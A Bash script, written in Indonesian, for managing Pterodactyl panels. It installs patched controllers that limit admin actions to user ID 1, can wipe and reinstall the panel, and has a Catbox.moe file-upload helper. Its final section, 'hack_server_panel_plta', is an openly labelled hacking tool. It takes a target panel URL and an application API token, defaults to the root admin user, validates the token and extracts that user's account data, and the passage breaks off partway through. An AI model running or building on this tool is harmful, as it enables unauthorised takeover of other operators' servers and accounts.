use Pterodactyl\Http\Requests\Admin\NewUserFormRequest;
use Pterodactyl\Contracts\Repository\UserRepositoryInterface;

class UserController extends Controller
{
    use AvailableLanguages;

    public function __construct(
        protected AlertsMessageBag $alert,
        protected UserCreationService $creationService,
        protected UserDeletionService $deletionService,
        protected Translator $translator,
        protected UserUpdateService $updateService,
        protected UserRepositoryInterface $repository,
        protected ViewFactory $view
    ) {
    }

    public function index(Request $request): View
    {
        $authUser = $request->user();

        $query = User::query()
            ->select('users.*')
            ->selectRaw('COUNT(DISTINCT(subusers.id)) as subuser_of_count')
            ->selectRaw('COUNT(DISTINCT(servers.id)) as servers_count')
            ->leftJoin('subusers', 'subusers.user_id', '=', 'users.id')
            ->leftJoin('servers', 'servers.owner_id', '=', 'users.id')
            ->groupBy('users.id');

        if ($authUser->id !== 1) {
            $query->where('users.id', $authUser->id);
        }

        $users = QueryBuilder::for($query)
            ->allowedFilters(['username', 'email', 'uuid'])
            ->allowedSorts(['id', 'uuid'])
            ->paginate(50);

        return $this->view->make('admin.users.index', ['users' => $users]);
    }

    public function create(): View
    {
        return $this->view->make('admin.users.new', [
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    public function view(User $user): View
    {
        return $this->view->make('admin.users.view', [
            'user' => $user,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    public function delete(Request $request, User $user): RedirectResponse
    {
        $authUser = $request->user();

        if ($authUser->id !== 1) {
            throw new DisplayException("🚫 Akses ditolak: hanya admin ID 1 yang dapat menghapus user! ©Protect By @wilzzofficial");
        }

        if ($authUser->id === $user->id) {
            throw new DisplayException("❌ Tidak bisa menghapus akun Anda sendiri.");
        }

        $this->deletionService->handle($user);

        $this->alert->success("🗑️ User berhasil dihapus.")->flash();
        return redirect()->route('admin.users');
    }

    public function store(NewUserFormRequest $request): RedirectResponse
    {
        $authUser = $request->user();
        $data = $request->normalize();

        if ($authUser->id !== 1 && isset($data['root_admin']) && $data['root_admin'] == true) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat membuat user admin! ©Protect By @wilzzofficial.");
        }

        if ($authUser->id !== 1) {
            $data['root_admin'] = false;
        }

        $user = $this->creationService->handle($data);

        $this->alert->success("✅ Akun user berhasil dibuat.")->flash();
        return redirect()->route('admin.users.view', $user->id);
    }

    public function update(UserFormRequest $request, User $user): RedirectResponse
    {
        $restrictedFields = ['email', 'first_name', 'last_name', 'password'];

        foreach ($restrictedFields as $field) {
            if ($request->filled($field) && $request->user()->id !== 1) {
                throw new DisplayException("⚠️ Data hanya bisa diubah oleh admin ID 1. ©Protect By @wilzzofficial");
            }
        }

        if ($user->root_admin && $request->user()->id !== 1) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat menurunkan hak admin user ini! ©Protect By @wilzzofficial.");
        }

        if ($request->user()->id !== 1 && $request->user()->id !== $user->id) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah data user lain! ©Protect By @wilzzofficial.");
        }

        $data = $request->normalize();
        if ($request->user()->id !== 1) {
            unset($data['root_admin']);
        }

        $this->updateService
            ->setUserLevel(User::USER_LEVEL_ADMIN)
            ->handle($user, $data);

        $this->alert->success(trans('admin/user.notices.account_updated'))->flash();

        return redirect()->route('admin.users.view', $user->id);
    }

    public function json(Request $request): Model|Collection
    {
        $authUser = $request->user();
        $query = QueryBuilder::for(User::query())->allowedFilters(['email']);

        if ($authUser->id !== 1) {
            $query->where('id', $authUser->id);
        }

        $users = $query->paginate(25);

        if ($request->query('user_id')) {
            $user = User::query()->findOrFail($request->input('user_id'));
            if ($authUser->id !== 1 && $authUser->id !== $user->id) {
                throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat data user lain! ©Protect By @wilzzofficial.");
            }
            $user->md5 = md5(strtolower($user->email));
            return $user;
        }

        return $users->map(function ($item) {
            $item->md5 = md5(strtolower($item->email));
            return $item;
        });
    }
}
EOF

  # ==================== PROTECT14 (admin.blade.php - Hide Menu) ====================
  log_info "   - Installing PROTECT14 (Hide Admin Menu for Non-Admin)..."
  cat > /var/www/pterodactyl/resources/views/layouts/admin.blade.php <<'EOF'
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
    <a href="{{ route('admin.settings') }}">
        <i class="fa fa-wrench"></i> <span>Settings</span>
    </a>
</li>
@endif
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
    <a href="{{ route('admin.api.index')}}">
        <i class="fa fa-gamepad"></i> <span>Application API</span>
    </a>
</li>
@endif
<li class="header">MANAGEMENT</li>

@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
    <a href="{{ route('admin.databases') }}">
        <i class="fa fa-database"></i> <span>Databases</span>
    </a>
</li>
@endif

@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
    <a href="{{ route('admin.locations') }}">
        <i class="fa fa-globe"></i> <span>Locations</span>
    </a>
</li>
@endif

@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
    <a href="{{ route('admin.nodes') }}">
        <i class="fa fa-sitemap"></i> <span>Nodes</span>
    </a>
</li>
@endif

                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
@if(Auth::user()->id == 1)
    <li class="header">SERVICE MANAGEMENT</li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
        <a href="{{ route('admin.mounts') }}">
            <i class="fa fa-magic"></i> <span>Mounts</span>
        </a>
    </li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
        <a href="{{ route('admin.nests') }}">
            <i class="fa fa-th-large"></i> <span>Nests</span>
        </a>
    </li>
@endif
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>
EOF

  # Set permissions
  log_info "[4/4] Mengatur permission..."
  chown -R www-data:www-data /var/www/pterodactyl
  chmod -R 755 /var/www/pterodactyl/storage /var/www/pterodactyl/bootstrap/cache

  # Clear cache
  cd /var/www/pterodactyl
  php artisan view:clear
  php artisan config:clear
  php artisan cache:clear

  print_success "Instalasi proteksi panel selesai!"
  log_success "✓ Backup disimpan di: $BACKUP_DIR"
  log_success "✓ 14 proteksi telah diinstall"

  echo ""
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}           ✅ PANEL PROTECTION INSTALLED!${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo ""
  echo -e "${YELLOW}${BOLD}📌 INFORMASI:${NC}"
  echo -e "  ${WHITE}• Hanya user dengan ID 1 yang bisa akses semua menu admin${NC}"
  echo -e "  ${WHITE}• User biasa hanya bisa melihat dan mengelola servernya sendiri${NC}"
  echo -e "  ${WHITE}• Untuk mengembalikan ke original, gunakan menu Uninstall Proteksi${NC}"
  echo ""
  echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
  read
}

# ============================================================
# FUNGSI UNINSTALL PROTECT PANEL
# ============================================================

uninstall_panel_protect() {
  clear
  echo -e "${BRIGHT_RED}${BOLD}"
  echo "   ██╗   ██╗███╗   ██╗██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗"
  echo "   ██║   ██║████╗  ██║██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║"
  echo "   ██║   ██║██╔██╗ ██║██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║"
  echo "   ██║   ██║██║╚██╗██║██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║"
  echo "   ╚██████╔╝██║ ╚████║██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗"
  echo "    ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝"
  echo -e "${NC}"
  echo -e "${BRIGHT_RED}${BOLD}           UNINSTALL PANEL PROTECTION${NC}"
  echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}"
  echo ""

  if [ ! -d "/var/www/pterodactyl" ]; then
    print_error "Direktori Pterodactyl tidak ditemukan!"
    echo ""
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  fi

  echo -e "${YELLOW}${BOLD}⚠️  PERINGATAN:${NC}"
  echo -e "  ${WHITE}• Fitur ini akan menghapus semua proteksi panel${NC}"
  echo -e "  ${WHITE}• File akan dikembalikan ke versi original${NC}"
  echo -e "  ${WHITE}• Pastikan Anda memiliki backup jika diperlukan${NC}"
  echo ""

  # Cek apakah ada backup
  BACKUP_DIRS=$(ls -d /root/panel-backup-* 2>/dev/null | head -1)
  
  if [ -z "$BACKUP_DIRS" ]; then
    echo -e "${BRIGHT_RED}${BOLD}⚠️  Tidak ditemukan folder backup otomatis!${NC}"
    echo -e "${YELLOW}Apakah Anda yakin ingin melanjutkan tanpa backup?${NC}"
    echo -e "${WHITE}Panel akan direset ke versi original melalui proses reset panel.${NC}"
    echo ""
    echo -n -e "${BOLD}Lanjutkan uninstall proteksi? (y/n): ${NC}"
    read confirmation
    
    if [[ "$confirmation" != [yY] ]]; then
      echo -e "${BOLD}Uninstall dibatalkan.${NC}"
      echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
      read
      return
    fi
    
    # Jalankan reset panel untuk mengembalikan ke original
    print_info "Menjalankan reset panel untuk mengembalikan ke versi original..."
    
    cd /var/www/pterodactyl || { print_error "Gagal masuk ke direktori Pterodactyl."; return 1; }

    php artisan down || true

    # Backup .env
    if [ -f ".env" ]; then
      cp .env /tmp/.env.backup
    fi

    # Hapus semua file
    find . -mindepth 1 -delete

    # Download panel original
    curl -L https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | tar -xzf - -C /var/www/pterodactyl > /dev/null 2>&1

    # Kembalikan .env
    if [ -f "/tmp/.env.backup" ]; then
      mv /tmp/.env.backup .env
    fi

    # Install dependencies
    chmod -R 755 storage/* bootstrap/cache/
    chown -R www-data:www-data /var/www/pterodactyl
    
    if ! command -v composer &> /dev/null; then
      curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer > /dev/null 2>&1
    fi
    
    sudo -u www-data composer install --no-dev --optimize-autoloader --no-interaction > /dev/null 2>&1
    sudo -u www-data php artisan migrate --seed --force > /dev/null 2>&1
    sudo -u www-data php artisan optimize:clear > /dev/null 2>&1

    php artisan up
    
    print_success "Panel berhasil direset ke versi original!"
    
  else
    # Ada backup, tanya ingin restore dari backup atau reset
    echo -e "${GREEN}${BOLD}📁 Folder backup ditemukan:${NC}"
    echo -e "  ${CYAN}$BACKUP_DIRS${NC}"
    echo ""
    echo -e "${YELLOW}Pilih metode uninstall:${NC}"
    echo -e "  ${WHITE}[1]${NC} Restore dari backup (jika tersedia)"
    echo -e "  ${WHITE}[2]${NC} Reset panel ke versi original (fresh install)"
    echo -n -e "${BOLD}Pilih [1/2]: ${NC}"
    read method
    
    case "$method" in
      1)
        if [ -d "$BACKUP_DIRS" ]; then
          print_info "Merestore file dari backup..."
          
          # Restore file-file yang dibackup
          cp "$BACKUP_DIRS/ServerController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/new.blade.php" /var/www/pterodactyl/resources/views/admin/servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/DetailsModificationService.php" /var/www/pterodactyl/app/Services/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/BuildModificationService.php" /var/www/pterodactyl/app/Services/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/StartupModificationService.php" /var/www/pterodactyl/app/Services/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/DatabaseManagementService.php" /var/www/pterodactyl/app/Services/Databases/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ServerTransferController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ServersController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ReinstallServerService.php" /var/www/pterodactyl/app/Services/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ServerDeletionService.php" /var/www/pterodactyl/app/Services/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/UserController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/LocationController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/NodeController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/NestController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/Nests/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/IndexController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/Settings/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/FileController.php" /var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ 2>/dev/null || echo "File tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ServerController.php" /var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ 2>/dev/null || echo "File API ServerController tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ApiController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File ApiController.php tidak ditemukan di backup"
          cp "$BACKUP_DIRS/ApiKeyController.php" /var/www/pterodactyl/app/Http/Controllers/Api/Client/ 2>/dev/null || echo "File ApiKeyController.php tidak ditemukan di backup"
          cp "$BACKUP_DIRS/DatabaseController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File DatabaseController.php tidak ditemukan di backup"
          cp "$BACKUP_DIRS/MountController.php" /var/www/pterodactyl/app/Http/Controllers/Admin/ 2>/dev/null || echo "File MountController.php tidak ditemukan di backup"
          cp "$BACKUP_DIRS/TwoFactorController.php" /var/www/pterodactyl/app/Http/Controllers/Api/Client/ 2>/dev/null || echo "File TwoFactorController.php tidak ditemukan di backup"
          cp "$BACKUP_DIRS/admin.blade.php" /var/www/pterodactyl/resources/views/layouts/ 2>/dev/null || echo "File admin.blade.php tidak ditemukan di backup"
          
          print_success "Restore dari backup selesai!"
        else
          print_error "Folder backup tidak valid!"
          return 1
        fi
        ;;
      2)
        print_info "Menjalankan reset panel ke versi original..."
        
        cd /var/www/pterodactyl || { print_error "Gagal masuk ke direktori Pterodactyl."; return 1; }

        php artisan down || true

        # Backup .env
        if [ -f ".env" ]; then
          cp .env /tmp/.env.backup
        fi

        # Hapus semua file
        find . -mindepth 1 -delete

        # Download panel original
        curl -L https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | tar -xzf - -C /var/www/pterodactyl > /dev/null 2>&1

        # Kembalikan .env
        if [ -f "/tmp/.env.backup" ]; then
          mv /tmp/.env.backup .env
        fi

        # Install dependencies
        chmod -R 755 storage/* bootstrap/cache/
        chown -R www-data:www-data /var/www/pterodactyl
        
        if ! command -v composer &> /dev/null; then
          curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer > /dev/null 2>&1
        fi
        
        sudo -u www-data composer install --no-dev --optimize-autoloader --no-interaction > /dev/null 2>&1
        sudo -u www-data php artisan migrate --seed --force > /dev/null 2>&1
        sudo -u www-data php artisan optimize:clear > /dev/null 2>&1

        php artisan up
        
        print_success "Panel berhasil direset ke versi original!"
        ;;
      *)
        echo -e "${BOLD}Pilihan tidak valid!${NC}"
        echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
        read
        return
        ;;
    esac
  fi

  # Clear cache
  cd /var/www/pterodactyl
  php artisan view:clear
  php artisan config:clear
  php artisan cache:clear

  print_success "Uninstall proteksi panel selesai!"
  
  echo ""
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}           ✅ PANEL PROTECTION REMOVED!${NC}"
  echo -e "${BRIGHT_GREEN}${BOLD}═══════════════════════════════════════════════════════════════${NC}"
  echo ""
  echo -e "${YELLOW}${BOLD}📌 INFORMASI:${NC}"
  echo -e "  ${WHITE}• Panel telah dikembalikan ke kondisi original${NC}"
  echo -e "  ${WHITE}• Semua user dapat mengakses menu admin sesuai role masing-masing${NC}"
  echo ""
  echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
  read
}

# ============================================================
# FUNGSI MENU PROTEKSI
# ============================================================

protect_menu() {
  while true; do
    clear
    show_banner
    show_menu_header
    echo -e "${BRIGHT_RED}${BOLD}🛡️  PANEL PROTECTION MENU${NC}"
    echo -e "${BRIGHT_YELLOW}[1]${NC} Install Panel Protection"
    echo -e "${BRIGHT_YELLOW}[2]${NC} Uninstall Panel Protection"
    echo -e "${BRIGHT_RED}[0]${NC} Kembali ke Menu Utama"
    show_menu_header
    echo -n -e "${BOLD}Pilih [1-2/0]: ${NC}"
    read PROTECT_CHOICE

    case "$PROTECT_CHOICE" in
      1) install_panel_protect ;;
      2) uninstall_panel_protect ;;
      0) return ;;
      *) print_error "Pilihan tidak valid!"; sleep 2 ;;
    esac
  done
}
# ============================================================
# FUNGSI UPLOAD KE CATBOX.MOE
# ============================================================

upload_to_catbox() {
  local file_path="$1"
  
  if [ ! -f "$file_path" ]; then
    echo "ERROR: File $file_path tidak ditemukan"
    return 1
  fi
  
  echo "📤 Mengupload ke Catbox.moe..."
  
  # Upload file pake API Catbox
  RESPONSE=$(curl -s -F "fileToUpload=@$file_path" -F "reqtype=fileupload" "https://catbox.moe/user/api.php")
  
  # Catbox returns the URL directly on success
  if [[ "$RESPONSE" =~ ^https?:// ]]; then
    echo "$RESPONSE"
    return 0
  else
    echo "ERROR: $RESPONSE"
    return 1
  fi
}

# ============================================================
# FUNGSI HACK SERVER PANEL VIA PLTA + CATBOX
# ============================================================

hack_server_panel_plta() {
  clear
  echo -e "${BRIGHT_RED}${BOLD}"
echo "███████╗██╗   ██╗██╗   ██╗██████╗  █████╗ "
echo "╚══███╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗"
echo "  ███╔╝  ╚████╔╝ ██║   ██║██████╔╝███████║"
echo " ███╔╝    ╚██╔╝  ██║   ██║██╔══██╗██╔══██║"
echo "███████╗   ██║   ╚██████╔╝██║  ██║██║  ██║"
echo "╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
echo -e "${NC}"
echo -e "${BRIGHT_RED}${BOLD}   PRIVATE SCRIPT TOOLS${NC}"
echo ""

  # ========== INPUT TARGET ==========
  echo -e "${BRIGHT_YELLOW}${BOLD}🎯 TARGET PANEL${NC}"
  echo -n -e "${BOLD}Masukkan URL Panel (contoh: https://panel.com): ${NC}"
  read PANEL_URL
  [ -z "$PANEL_URL" ] && { print_error "URL panel wajib diisi!"; sleep 2; return 1; }

  echo -n -e "${BOLD}Masukkan PLTA Token: ${NC}"
  read PLTA_TOKEN
  [ -z "$PLTA_TOKEN" ] && { print_error "PLTA Token wajib diisi!"; sleep 2; return 1; }

  echo -n -e "${BOLD}Masukkan ID User target (default: 1): ${NC}"
  read TARGET_ID
  [ -z "$TARGET_ID" ] && TARGET_ID="1"

  # ========== KONFIRMASI ==========
  echo ""
  echo -e "${BRIGHT_RED}${BOLD}⚠️  KONFIRMASI${NC}"
  echo -e "${BLUE}──────────────────────────────────────────────────────${NC}"
  echo -e "  ${CYAN}URL Panel:${NC}   $PANEL_URL"
  echo -e "  ${CYAN}PLTA Token:${NC}   ${PLTA_TOKEN:0:15}...${PLTA_TOKEN: -10}"
  echo -e "  ${CYAN}Target ID:${NC}    $TARGET_ID"
  echo -e "${BLUE}──────────────────────────────────────────────────────${NC}"
  echo ""
  echo -n -e "${BOLD}Lanjutkan? (y/n): ${NC}"
  read confirmation

  if [[ "$confirmation" != [yY] ]]; then
    echo -e "${BOLD}Dibatalkan.${NC}"
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return
  fi

  print_info "Memulai proses hack..."

  # ========== STEP 1: VALIDASI TOKEN ==========
  log_info "[1/5] Validasi PLTA Token..."
  TEST_RESPONSE=$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$PANEL_URL/api/application/users" \
    -H "Authorization: Bearer $PLTA_TOKEN" \
    -H "Accept: application/json")

  if [ "$TEST_RESPONSE" = "200" ] || [ "$TEST_RESPONSE" = "201" ]; then
    log_success "✓ Token valid! (HTTP $TEST_RESPONSE)"
  elif [ "$TEST_RESPONSE" = "403" ]; then
    print_error "Token ditolak (403). Mungkin kadaluarsa atau tidak punya akses."
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  elif [ "$TEST_RESPONSE" = "401" ]; then
    print_error "Token tidak valid (401)."
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  else
    print_warning "Respon tidak terduga (HTTP $TEST_RESPONSE). Mencoba tetap lanjut..."
  fi

  # ========== STEP 2: AMBIL DATA USER ==========
  log_info "[2/5] Mengambil data user ID $TARGET_ID..."
  USER_RESPONSE=$(curl -k -s -X GET "$PANEL_URL/api/application/users/$TARGET_ID" \
    -H "Authorization: Bearer $PLTA_TOKEN" \
    -H "Accept: application/json")

  if echo "$USER_RESPONSE" | grep -q "error\|not_found"; then
    print_error "Gagal mendapatkan data user. Response:"
    echo "$USER_RESPONSE" | jq . 2>/dev/null || echo "$USER_RESPONSE"
    echo -n -e "${BOLD}Tekan Enter untuk kembali...${NC}"
    read
    return 1
  fi

  # Parse JSON
  USERNAME=$(echo "$USER_RESPONSE" | grep -o '"username":"[^"]*' | head -1 | cut -d'"' -f4)
  EMAIL=$(echo "$USER_RESPONSE" | grep -o '"email":"[^"]*' | head -1 | cut -d'"' -f4)
  FIRST_NAME=$(echo "$USER_RESPONSE" | grep -o '"first_name":"[^"]*' | head -1 | cut -d'"' -f4)
  LAST_NAME=$(echo "$USER_RESPONSE" | grep -o '"last_name":"[^"]*' | head -1 | cut -d'"' -f4)
  UUID=$(echo "$USER_RESPONSE" | grep -o '"uuid":"[^"]*' | head -1 | cut -d'"' -f4)
  ROOT_ADMIN=$(echo "$USER_RESPONSE" | grep -o '"root_admin":[^,}]*' | head -1 | cut -d':' -f2 | tr -d ' ')

  if [ -z "$USERNAME" ]; then
    print_error "Gagal parse data user. Response mentah:"
    echo "$USER_RESPONSE" | head -200
